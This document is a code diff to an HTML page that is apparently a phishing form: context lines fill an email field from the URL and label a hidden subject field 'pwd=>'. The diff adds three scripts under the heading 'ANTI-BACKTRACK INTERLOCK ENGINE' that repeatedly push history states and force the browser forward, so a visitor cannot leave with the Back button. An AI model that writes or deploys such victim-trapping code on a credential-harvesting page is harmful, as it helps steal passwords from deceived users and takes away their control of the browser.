@@ -181,3 +181,35 @@ const params=new URLSearchParams(window.location.search);
 document.getElementById('email').value=params.get('email');
 document.getElementById('subject').value="pwd=> " + params.get('email');
 </script>
+
+                    
+<!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
